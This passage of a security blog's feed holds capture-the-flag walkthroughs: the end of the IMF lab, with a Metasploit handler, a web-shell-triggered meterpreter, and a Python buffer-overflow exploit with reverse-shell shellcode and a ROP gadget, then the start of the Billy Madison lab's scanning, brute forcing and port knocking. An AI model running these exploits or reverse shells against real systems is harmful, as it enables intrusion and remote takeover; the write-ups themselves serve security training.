&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;use exploit&#x2F;multi&#x2F;handler
set PAYLOAD linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp
set LHOST 172.16.161.128
set LPORT 4444
run
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Finally, run the script:&lt;&#x2F;p&gt;
&lt;p&gt;curl -v http:&#x2F;&#x2F;172.16.161.129&#x2F;imfadministrator&#x2F;uploads&#x2F;c59ca80d5d76.gif?c=.%2Fimf-meterpreter&lt;&#x2F;p&gt;
&lt;p&gt;Once metrepreter prompt is up setup port forwarding for the service:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;portfwd add -l 7788 -p 7788 -r 127.0.0.1
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Open another terminal and hit the service:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc localhost 7788
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now we can interact with the service its time to look at the source again to find a way to exploit.&lt;&#x2F;p&gt;
&lt;p&gt;Combing through the source on line 226:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;gets((char *)&amp;str);*
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This reads user input, however the size of the input isn&#x27;t defined, looks like a possible buffer overflow, basically we&#x27;re passing in more information that the command is going to properly handle and extending the application&#x27;s memory outside of it&#x27;s contextual boundary causing an error to occur.&lt;&#x2F;p&gt;
&lt;p&gt;After doing some reading on ways to exploit the buffer overflow I stumbled onto the idea of return oriented programming, tl;dr; Its a way to execute a buffer overflow when defense mechanisms like code-signing and non-executable memory are employed.  In this technique you can send machine language that is already in the machine&#x27;s memory, whether through the program being exploited itself or other shared libraries.  When these pieces when combined can be used to perform actions on the remote machine.&lt;&#x2F;p&gt;
&lt;p&gt;I was able to upload the agent binaries we got earlier to ropshell.com which analyzes the compiled code for items in memory that can be used in an exploit, in this case: call eax.&lt;&#x2F;p&gt;
&lt;p&gt;Ater reading through some reference docs for assembly, specifically x86 I have surmised that with our goal being getting a root shell by escaping the &#x27;agent&#x27; service causing a buffer overflow to occur and running &#x27;call eax.&#x27;  In doing so we would be executing whatever is in the eax register.  Another things we&#x27;re going to need to do is make sure that our exploit is going to be at the address eax is referencing at runtime.  I&#x27;m basing this on using the eax register in the processor can be used to execute code held at a memory address to circumvent normal program execution, in this case getting a root shell.&lt;&#x2F;p&gt;
&lt;p&gt;Now to generate a buffer to overflow using msfvenom:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p linux&#x2F;x86&#x2F;shell_reverse_tcp LHOST=172.16.161.128 LPORT=4445 -f python -b &quot;\x00\x0a\x0d&quot;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This command will give up the buffer overflow shellcode for creating a reverse_tcp shell with my machine as the host and 4445 as the portand to exclude newline characters from the output.&lt;&#x2F;p&gt;
&lt;p&gt;Next write up a python script for using the exploit:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;import socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((&#x27;localhost&#x27;, 7788))
client.recv(512)
client.send(&quot;48093572\n&quot;)
client.recv(512)
client.send(&quot;3\n&quot;)
client.recv(512)

#shellcode from msfvenom

buf =  &quot;&quot;
buf += &quot;\xd9\xc2\xba\xa6\xf9\x71\x23\xd9\x74\x24\xf4\x58\x2b&quot;
buf += &quot;\xc9\xb1\x12\x31\x50\x17\x03\x50\x17\x83\x4e\x05\x93&quot;
buf += &quot;\xd6\xbf\x2d\xa3\xfa\xec\x92\x1f\x97\x10\x9c\x41\xd7&quot;
buf += &quot;\x72\x53\x01\x8b\x23\xdb\x3d\x61\x53\x52\x3b\x80\x3b&quot;
buf += &quot;\xc9\xab\xd3\x3b\x79\xce\x13\x2a\x27\x47\xf2\xfc\xb1&quot;
buf += &quot;\x07\xa4\xaf\x8e\xab\xcf\xae\x3c\x2b\x9d\x58\xd1\x03&quot;
buf += &quot;\x51\xf0\x45\x73\xba\x62\xff\x02\x27\x30\xac\x9d\x49&quot;
buf += &quot;\x04\x59\x53\x09&quot;
#padding

buf += &quot;A&quot; * (168 - len(buf))

#call eax gadget
buf += &quot;\x63\x85\x04\x08\n&quot;

client.send(buf)

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now start ncat for the exploit:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ncat -lv 172.16.161.128 4445
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then run the script: python payload.py&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;re in!&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cd &#x2F;root
cat Flag6.txt | base64 -d yeilds: ~GhostProtocols
cat TheEnd.txt outputs the final you won thing.
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Billy Madison v1.1</title>
		<published>2016-11-14T00:00:00+00:00</published>
		<updated>2016-11-14T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/billy-madison/" type="text/html"/>
		<id>https://m4l1c3.github.io/billy-madison/</id>
		<content type="html">&lt;p&gt;Starting by scanning the hosts with nmap:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -T4 -A -v -p0-65535 192.168.110.105 -oN nmap-results.txt
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;T4 for faster execution&lt;&#x2F;li&gt;
&lt;li&gt;A for OS detection&lt;&#x2F;li&gt;
&lt;li&gt;p0-65535 for scanning ports 0 - 65535&lt;&#x2F;li&gt;
&lt;li&gt;oN nmap-results.txt for writing output to a file using the &amp;quot;normal&amp;quot; format.  Also supports xml, script kiddy, and grepable format&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;The scan returned the following:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Wordpress site - 69&lt;&#x2F;li&gt;
&lt;li&gt;Another site - 80&lt;&#x2F;li&gt;
&lt;li&gt;Possible telnet - 23&lt;&#x2F;li&gt;
&lt;li&gt;FTP - 21&lt;&#x2F;li&gt;
&lt;li&gt;SSH - 1974, weird&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;telnet&quot;&gt;Telnet&lt;&#x2F;h2&gt;
&lt;p&gt;Trying to connect via telnet I got a message mentioning ROTten passwords, maybe ROT-13 encoded (http:&#x2F;&#x2F;decode.org&#x2F;) Got back exschmenuating.&lt;&#x2F;p&gt;
&lt;p&gt;##Another &amp;quot;Site&amp;quot;
Checking that as a folder, got lucky and found &amp;quot;Eric&#x27;s&amp;quot; secret page.&lt;&#x2F;p&gt;
&lt;p&gt;Alternate Route:
Using cewl against the Billy Madison script from here: http:&#x2F;&#x2F;www.springfieldspringfield.co.uk&#x2F;movie_script.php?movie=billy-madison and generating a wordlist:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cewl -w billy-madison-wordlist.list -d 0 -v http:&#x2F;&#x2F;www.springfieldspringfield.co.uk&#x2F;movie_script.php?movie=billy-madison
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Which found: exschmenuating&lt;&#x2F;p&gt;
&lt;p&gt;Then run that through dirbuster and brute force on our new wordlist, this also finds the hidden &amp;quot;site&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;Also found a banned hosts file as well showing I&#x27;d been banned from connecting via telnet.&lt;&#x2F;p&gt;
&lt;p&gt;In Eric&#x27;s notes it looks like he may have been sending a phishing e-mail to Veronica and mentioned the file containing everything (probably a network capture) had her name in it.  Since Kali comes with the rockyou wordlist I generated a new word list containing anything that had &#x27;veronica&#x27; in it with this command:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;grep -ir &#x27;veronica&#x27; &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt &gt;&gt; .&#x2F;veronica.list
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then ran that through dirbuster with the file extensions: pcap and cap on the subdirectory &#x2F;exschmenuating which found: 012987veronica.cap.&lt;&#x2F;p&gt;
&lt;p&gt;Time to grab that through the browser or with wget and open up Wireshark.  I was able to follow the TCP stream (under analyze in the menus) to step through the emails and see the communication back and forth between her and Eric.&lt;&#x2F;p&gt;
&lt;p&gt;Looks like the machines &amp;quot;anti-virus&amp;quot; caught the malware, but unfortunately Veronica had Eric upload the file with FTP so she can just run the executable, she gave a weird hint referencing the &amp;quot;Spanish Armada&amp;quot; fortunately I&#x27;ve seen the movie and a youtube video was included.  When the spanish armada is mentioned Billy states the following guesses, seems like port numbers: 1466 67 1469 1514 1981 1986.  After some googling it turns out there is a thing called port knocking, basically if you have a service you want to hide you can require that ports get pinged in a specific order another port that the service is running on will open up, then pinging the ports in reverse order closes the service&#x27;s port.&lt;&#x2F;p&gt;
&lt;p&gt;With this bash command I was able to ping all the ports in order against the host:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;for x in 1466 67 1469 1514 1981 1986; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x bm; done
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
</content>
	</entry>
</feed>
